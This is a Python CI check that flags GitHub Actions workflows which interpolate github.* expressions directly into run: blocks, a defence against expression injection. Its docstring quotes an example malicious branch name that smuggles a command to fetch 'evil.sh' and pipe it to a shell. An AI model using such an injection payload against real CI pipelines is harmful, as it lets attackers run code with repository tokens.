#!/usr/bin/env python3
"""CI gate (issue #574): reject `${{ github.* }}` inside `run:` blocks.

GitHub expands workflow expressions BEFORE the shell parses a `run:`
script, so any `github.*` value that can carry attacker-controlled bytes
(`head_ref` / `title` / `event.pull_request.*` on a fork PR; `ref_name`
on a crafted tag) becomes classic expression injection: a branch named
``develop"; curl evil.sh | sh; #`` executes in the runner with the job's
GITHUB_TOKEN — the cheap route around the #389 digest-pinning + SLSA
posture. The safe pattern is env-var indirection (issue #301's PR-body
guard): map the value through ``env:`` and read ``"$VAR"`` — the runner
sets ``env:`` values without shell interpretation.

The scan is structural (yaml.safe_load), NOT textual: only the string
value of a step's ``run:`` key is checked (block scalar or plain scalar
alike), so legitimate ``${{ github.<safe> }}`` uses inside ``env:`` /
``with:`` / ``if:`` / ``name:`` blocks — the indirection pattern itself —
are never flagged. Same shape as scripts/check_redis_password_unique.sh
(issue #150's gate): exit 0 = clean; exit 1 = injection-shaped
interpolation found.

Run:
  python scripts/check_workflow_run_injections.py [dir]   # default .github/workflows

tests/test_ci_workflow_hygiene.py imports this module and runs the same
scan over the committed workflows plus synthetic fixtures, so the local
pytest suite fails first; this script is the CI wall that catches forks
without the dev environment.
"""

from __future__ import annotations

import pathlib
import re
import sys

import yaml

# `${{ github.` with optional whitespace after `{{` — GitHub expression
# syntax allows `${{github.head_ref}}` (no space).
GITHUB_EXPR = re.compile(r"\$\{\{\s*github\.")

# The one exemption context is structural: `run:` values are scanned,
# everything else (env:/with:/if:/name:) is the safe indirection shape
# and is not looked at at all.

DEFAULT_DIR = ".github/workflows"


def step_label(step: dict) -> str:
    """Human label for a step: its `name:` if present, else the run's
    first non-empty line (GitHub shows unnamed `- run: ...` steps that
    way in the UI)."""
    name = step.get("name")
    if isinstance(name, str) and name.strip():
        return name
    run = step.get("run")
    if isinstance(run, str):
        for line in run.splitlines():
            if line.strip():
                return line.strip()
    return "<unnamed step>"


def workflow_run_violations(path: pathlib.Path, doc: object) -> list[str]:
    """Every `${{ github.* }}` found inside a `run:` block of `doc`.

    `doc` is a parsed workflow: `jobs.<id>.steps[].run` is the only
    scanned position (plain scalars included — `- run: echo ${{ ... }}`
    is just as injectable as a block scalar).
    """
    violations: list[str] = []
    if not isinstance(doc, dict):
        return violations
    jobs = doc.get("jobs")
    if not isinstance(jobs, dict):
        return violations
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        for step in steps:
            if not isinstance(step, dict):
                continue
            run = step.get("run")
            if not isinstance(run, str):
                continue
            match = GITHUB_EXPR.search(run)
            if match is not None:
                snippet = next(
                    (line.strip() for line in run.splitlines() if GITHUB_EXPR.search(line)),
                    run.strip(),
                )
                violations.append(
                    f"{path}: job '{job_id}', step '{step_label(step)}' "
                    f"interpolates a github.* expression directly into a "
                    f"run: block (offending line: {snippet!r}) — pass it via "
                    f"env: and read \"$VAR\" instead (issue #574)"
                )
    return violations


def scan_dir(root: pathlib.Path) -> list[str]:
    """Scan every workflow file under `root` (`.yml` + `.yaml`)."""
    violations: list[str] = []
    paths = sorted(root.glob("*.yml")) + sorted(root.glob("*.yaml"))
    for path in paths:
        try:
            doc = yaml.safe_load(path.read_text(encoding="utf-8"))
        except yaml.YAMLError as exc:
            violations.append(f"{path}: not parseable YAML: {exc}")
            continue
        violations.extend(workflow_run_violations(path, doc))
    return violations


def main(argv: list[str]) -> int:
    # `argv` is the post-program-name argument list (sys.argv[1:]), so the
    # optional scan directory — if given — is argv[0].
    root = pathlib.Path(argv[0]) if argv else pathlib.Path(DEFAULT_DIR)
    if not root.is_dir():
        print(f"::error::workflow directory not found: {root}")
        return 1
    violations = scan_dir(root)
    for violation in violations:
        print(f"::error::{violation}")
    if violations:
        print(
            "Workflows must pass github.* values through env: indirection, "
            "never direct run: interpolation (issue #574; the #301 PR-body "
            "guard in ci.yml shows the pattern)."
        )
        return 1
    print(f"workflow run-block injection guard: clean ({root}, issue #574)")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
